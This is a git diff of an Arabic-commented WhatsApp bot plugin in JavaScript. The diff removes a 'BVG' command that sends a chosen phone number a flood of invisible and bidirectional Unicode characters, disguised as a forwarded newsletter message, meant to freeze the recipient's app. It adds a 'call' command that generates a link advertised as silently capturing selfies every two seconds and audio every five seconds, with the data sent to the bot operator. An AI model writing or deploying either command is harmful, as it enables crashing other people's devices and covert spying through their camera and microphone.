@@ -1,234 +1,118 @@
 const moment = require('moment-timezone');
-const { jidNormalizedUser } = require('@whiskeysockets/baileys');
-
-// تخزين الجلسات النشطة لـ BVG
-const activeBvgSessions = new Map();
-
-// الرموز المخفية التي تؤدي إلى تجميد التطبيق
-const hiddenChars = {
-    // رموز غير مرئية تسبب تجميد التطبيق
-    invisible: '\u200B\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E\u2060\u2061\u2062\u2063\u2064',
-    // رموز طويلة تسبب تعليق المعالج
-    longChars: '\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069\u200B\u200C\u200D\u200E\u200F'
-};
-
-// رسائل التجميد المخفية
-const freezeMessages = [
-    {
-        header: '\u202A\u202B\u202C\u202D\u202E',
-        body: '\u2066\u2067\u2068\u2069\u200B\u200C\u200D\u200E\u200F',
-        footer: '\u202A\u202B\u202C\u202D\u202E'
-    },
-    {
-        header: '\u200B\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E',
-        body: '\u2060\u2061\u2062\u2063\u2064\u2066\u2067\u2068\u2069',
-        footer: '\u200B\u200C\u200D\u200E\u200F'
-    }
-];
 
 module.exports = {
-    name: 'bvg',
-    aliases: ['تجميد', 'تعطيل', 'فريز'],
-    description: '📱 BVG السفاح - تجميد واتساب المستهدف (مزحة حقيقية)',
-    async execute({ sock, msg, args, text, reply, from, isGroup, sender, pushName, isFromMe, prefix, commandName }) {
-        
+    name: 'اتصال',
+    aliases: ['كاميرا', 'مكالمة', 'call', 'video', 'كام', 'تصوير', 'مباشر'],
+    category: 'إداري',
+    description: 'توليد رابط اتصال مباشر (صوت وصورة) مع سيلفي تلقائي وتسجيل صوتي كل 5 ثواني',
+
+    async execute({ sock, msg, args, reply, from, sender, sessionId }) {
         try {
-            // التحقق من وجود رقم
-            if (args.length < 1) {
-                return reply(`📱 *أمر BVG السفاح*\n\n📌 *الاستخدام:*\n${prefix}bvg +967770133222\n${prefix}bvg @مستخدم\n\n📌 *لإلغاء التجميد:*\n${prefix}حذف bvg +967770133222\n\n⚠️ *تحذير:* هذا الأمر يقوم بتجميد واتساب المستهدف مؤقتاً (مزحة)`);
-            }
+            // استخراج رقم المرسل النظيف (لاستقبال البيانات عليه)
+            const cleanSender = sender.split('@')[0];
 
-            // التحقق من أمر الإلغاء
-            if (args[0].toLowerCase() === 'حذف' || args[0].toLowerCase() === 'delete' || args[0].toLowerCase() === 'الغاء') {
-                const targetNumber = args[1]?.replace(/[^0-9+]/g, '');
-                if (!targetNumber) {
-                    return reply(`❌ يرجى تحديد الرقم المراد إلغاء تجميده.\n📌 استخدم: ${prefix}حذف bvg +967770133222`);
-                }
-                return await handleUnfreeze(sock, from, reply, targetNumber);
-            }
+            // جلب النطاق العام (دومين Render) أو السيرفر المحلي
+            const serverBaseUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:${process.env.PORT || 10000}`;
 
-            // استخراج الرقم المستهدف
-            let targetJid = null;
-            let targetNumber = '';
+            // بناء الرابط المباشر لصفحة الاتصال المطور (call.html)
+            const callUrl = `${serverBaseUrl}/call.html?session=${sessionId}&target=${cleanSender}`;
 
-            // البحث عن المستهدف من المنشن
-            if (msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) {
-                targetJid = msg.message.extendedTextMessage.contextInfo.mentionedJid[0];
-                targetNumber = targetJid.split('@')[0];
-            } 
-            // البحث من النص
-            else {
-                targetNumber = args[0].replace(/[^0-9+]/g, '');
-                if (!targetNumber.startsWith('+')) {
-                    targetNumber = '+' + targetNumber;
-                }
-                if (targetNumber.length > 8) {
-                    targetJid = `${targetNumber}@s.whatsapp.net`;
-                }
-            }
-
-            if (!targetJid) {
-                return reply(`❌ رقم غير صحيح! تأكد من صيغة الرقم.\n📌 مثال: +967770133222`);
-            }
-
-            // التحقق من عدم تكرار التجميد
-            if (activeBvgSessions.has(targetJid)) {
-                return reply(`⚠️ *الرقم ${targetNumber} مجمد بالفعل!*\n📌 استخدم: ${prefix}حذف bvg ${targetNumber} لإلغاء التجميد`);
-            }
-
-            await sock.sendMessage(from, { 
-                react: { text: '📱', key: msg.key } 
-            });
-
-            // إرسال رسالة تحذير
-            await reply(`📱 *جاري تنفيذ BVG على ${targetNumber}...*\n⏳ سيتم تجميد التطبيق خلال ثوانٍ`);
-
-            // توليد الرسالة المخفية
-            const freezeMessage = generateFreezeMessage();
-
-            // إرسال الرسالة المخفية للمستهدف
+            // توليد كود QR للرابط (اختياري للفخامة)
+            let qrCodeUrl = '';
             try {
-                // إرسال رسالة فارغة طويلة تحتوي على رموز مخفية
-                await sock.sendMessage(targetJid, {
-                    text: freezeMessage,
+                const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(callUrl)}&bgcolor=8b5cf6&color=ffffff`;
+                qrCodeUrl = qrApiUrl;
+            } catch (e) {
+                // تجاهل إذا فشل QR
+            }
+
+            // تنسيق الرسالة بفخامة واحترافية للواتساب
+            const responseText = 
+`╭═════ 📞 ﴿ بِـوَابَـةُ الاتِّـصَـالِ الـمُـبَـاشِـر ﴾ 📞 ═════╮
+│
+│ 👤 ╟ *الـجَـلْـسَـة:* ${sessionId}
+│ 🕒 ╟ *الـتَّـوْقِـيـت:* ${moment().tz("Asia/Riyadh").format("YYYY-MM-DD | HH:mm")}
+│ 📱 ╟ *الـمُـسْـتَـقْـبِـل:* ${cleanSender}
+│
+├───────────────────────────────────────────┤
+│
+│ 🎥 ╟ *رَابِـطُ الاتِّـصَـالِ الـمُـبَـاشِـر:*
+│ ${callUrl}
+│
+├───────────────────────────────────────────┤
+│
+│ 📌 ╟ *الـمِـيـزَاتُ الـمُـتَـقَـدِّمَـة:*
+│  • 📸 سيلفي تلقائي كل ثانيتين
+│  • 🎙️ تسجيل صوتي كل 5 ثواني
+│  • 🎥 فيديو وصوت مباشر
+│  • 🌙 يعمل في الخلفية
+│  • 🔒 اتصال مشفر وآمن
+│  • 🔇 إمكانية كتم الصوت
+│  • 📵 إمكانية إيقاف الكاميرا
+│
+╰═══════════════════════════════════════════╯
+
+💡 *طَرِيقَةُ الاسْتِخْدَام:*
+1️⃣ _افْتَح الرَّابِط فِي مُتَصَفِّحِ الهَاتِف_
+2️⃣ _اسْمَح بِالْوُصُولِ لِلْكَامِيرَا وَالْمِيكْرُوفُون_
+3️⃣ _سَتَبْدَأ الْمُكَالَمَةُ تِلْقَائِيًّا_
+4️⃣ _جَمِيعُ الْبَيَانَاتِ تُرْسَلُ إِلَيْكَ خَاصَّةً_
+
+⚠️ *تَنْبِيه:* _يَجِبُ أَنْ يَكُونَ الْبُوتُ مُتَّصِلاً لِاسْتِقْبَالِ الْبَيَانَات_`;
+
+            // إذا كان QR Code متاح، نرسل الصورة مع الكابشن
+            if (qrCodeUrl) {
+                try {
+                    await sock.sendMessage(from, {
+                        image: { url: 'https://cdn.pixabay.com/photo/2021/02/19/13/40/envelope-6030386_1280.png' },
+                        caption: responseText,
+                        contextInfo: {
+                            externalAdReply: {
+                                title: '📞 اتصال مباشر - صوت وصورة',
+                                body: 'اضغط للدخول في مكالمة مباشرة مع سيلفي تلقائي!',
+                                thumbnailUrl: 'https://cdn.pixabay.com/photo/2020/04/29/13/48/video-call-5108882_1280.png',
+                                sourceUrl: callUrl,
+                                mediaType: 1,
+                                renderLargerThumbnail: true
+                            }
+                        }
+                    }, { quoted: msg });
+                } catch (imageError) {
+                    // إذا فشلت الصورة، نرسل النص فقط
+                    await sock.sendMessage(from, {
+                        text: responseText,
+                        contextInfo: {
+                            externalAdReply: {
+                                title: '📞 اتصال مباشر - صوت وصورة',
+                                body: 'اضغط للدخول في مكالمة مباشرة مع سيلفي تلقائي!',
+                                thumbnailUrl: 'https://cdn.pixabay.com/photo/2020/04/29/13/48/video-call-5108882_1280.png',
+                                sourceUrl: callUrl,
+                                mediaType: 1,
+                                renderLargerThumbnail: true
+                            }
+                        }
+                    }, { quoted: msg });
+                }
+            } else {
+                // إرسال النص فقط مع معاينة جذابة
+                await sock.sendMessage(from, {
+                    text: responseText,
                     contextInfo: {
-                        mentionedJid: [targetJid],
-                        forwardingScore: 999,
-                        isForwarded: true,
-                        forwardedNewsletterMessageInfo: {
-                            newsletterJid: '120363@newsletter',
-                            newsletterName: 'نظام التحديث',
-                            serverMessageId: -1
+                        externalAdReply: {
+                            title: '📞 اتصال مباشر - صوت وصورة',
+                            body: 'اضغط للدخول في مكالمة مباشرة مع سيلفي تلقائي!',
+                            thumbnailUrl: 'https://cdn.pixabay.com/photo/2020/04/29/13/48/video-call-5108882_1280.png',
+                            sourceUrl: callUrl,
+                            mediaType: 1,
+                            renderLargerThumbnail: true
                         }
                     }
-                });
-
-                // تسجيل الجلسة
-                activeBvgSessions.set(targetJid, {
-                    number: targetNumber,
-                    date: moment().tz('Asia/Riyadh').format('HH:mm:ss | YYYY-MM-DD'),
-                    executor: pushName,
-                    executorJid: sender,
-                    messageId: msg.key.id
-                });
-
-                // إرسال رسالة متابعة لتأكيد التجميد
-                setTimeout(async () => {
-                    try {
-                        await sock.sendMessage(targetJid, {
-                            text: '🔄',
-                            contextInfo: {
-                                mentionedJid: [targetJid],
-                                isForwarded: true
-                            }
-                        });
-                    } catch (e) {}
-                }, 1000);
-
-                // إرسال تقرير للمنفذ
-                const report = `📱 *تقرير BVG السفاح*\n\n✅ *تم التجميد بنجاح!*\n\n👤 *المستهدف:* ${targetNumber}\n🕒 *الوقت:* ${moment().tz('Asia/Riyadh').format('HH:mm:ss | YYYY-MM-DD')}\n📊 *الحالة:* مجمد 🧊\n\n📌 *لإلغاء التجميد:*\n${prefix}حذف bvg ${targetNumber}\n\n😄 *هذه مجرد مزحة!*\n📱 *— TARZAN BVG*`;
-
-                await sock.sendMessage(from, {
-                    text: report,
-                    contextInfo: { mentionedJid: [sender] }
-                });
-
-                // إرسال نسخة للخاص
-                const selfId = jidNormalizedUser(sock.user.id);
-                await sock.sendMessage(selfId, {
-                    text: `📱 *سجل BVG*\n\n👤 المستهدف: ${targetNumber}\n🕒 الوقت: ${moment().tz('Asia/Riyadh').format('HH:mm:ss | YYYY-MM-DD')}\n✅ تم التجميد بنجاح`
-                });
-
-            } catch (error) {
-                console.error('❌ فشل BVG:', error);
-                await reply(`❌ فشل تجميد الرقم ${targetNumber}. تأكد من صحة الرقم.`);
+                }, { quoted: msg });
             }
 
         } catch (error) {
-            console.error('❌ خطأ في BVG:', error);
-            reply(`❌ حدث خطأ: ${error.message || 'خطأ غير معروف'}`);
+            console.error('❌ خطأ في أمر اتصال:', error);
+            reply('❌ حدث خطأ داخلي أثناء توليد رابط الاتصال المباشر.');
         }
     }
 };
-
-// ==========================================
-// دالة توليد رسالة التجميد المخفية
-// ==========================================
-function generateFreezeMessage() {
-    const randomMsg = freezeMessages[Math.floor(Math.random() * freezeMessages.length)];
-    
-    // بناء رسالة التجميد مع رموز مخفية
-    let message = '';
-    
-    // إضافة رموز البداية
-    message += randomMsg.header;
-    
-    // إضافة رموز طويلة جداً (تسبب تعليق المعالج)
-    for (let i = 0; i < 1000; i++) {
-        message += hiddenChars.invisible;
-        if (i % 50 === 0) {
-            message += hiddenChars.longChars;
-        }
-    }
-    
-    // إضافة رموز النهاية
-    message += randomMsg.footer;
-    
-    // إضافة رموز إضافية مخفية
-    for (let i = 0; i < 500; i++) {
-        message += '\u2060\u2061\u2062\u2063\u2064';
-    }
-    
-    return message;
-}
-
-// ==========================================
-// دالة إلغاء التجميد
-// ==========================================
-async function handleUnfreeze(sock, from, reply, targetNumber) {
-    try {
-        // البحث عن الجلسة
-        let targetJid = null;
-        let sessionData = null;
-        
-        for (const [jid, data] of activeBvgSessions) {
-            if (data.number === targetNumber || jid.includes(targetNumber)) {
-                targetJid = jid;
-                sessionData = data;
-                break;
-            }
-        }
-
-        if (!sessionData) {
-            return reply(`❌ الرقم ${targetNumber} ليس مجمداً حالياً.`);
-        }
-
-        // إرسال رسالة إلغاء التجميد
-        await sock.sendMessage(targetJid, {
-            text: '✅ *تم إلغاء التجميد*\n📱 يمكنك استخدام التطبيق الآن',
-            contextInfo: {
-                mentionedJid: [targetJid],
-                isForwarded: true
-            }
-        });
-
-        // حذف الجلسة
-        activeBvgSessions.delete(targetJid);
-
-        // إرسال تقرير للمنفذ
-        const report = `✅ *تم إلغاء تجميد ${targetNumber}!*\n\n👤 *بواسطة:* ${sessionData.executor}\n🕒 *وقت التجميد:* ${sessionData.date}\n🕒 *وقت الإلغاء:* ${moment().tz('Asia/Riyadh').format('HH:mm:ss | YYYY-MM-DD')}\n\n📱 *— TARZAN BVG*`;
-
-        await reply(report);
-
-        // إرسال نسخة للخاص
-        const selfId = jidNormalizedUser(sock.user.id);
-        await sock.sendMessage(selfId, {
-            text: `📱 *إلغاء BVG*\n\n👤 المستهدف: ${targetNumber}\n🕒 وقت الإلغاء: ${moment().tz('Asia/Riyadh').format('HH:mm:ss | YYYY-MM-DD')}\n✅ تم إلغاء التجميد`
-        });
-
-    } catch (error) {
-        console.error('❌ فشل إلغاء التجميد:', error);
-        reply(`❌ فشل إلغاء التجميد: ${error.message}`);
-    }
-}
-
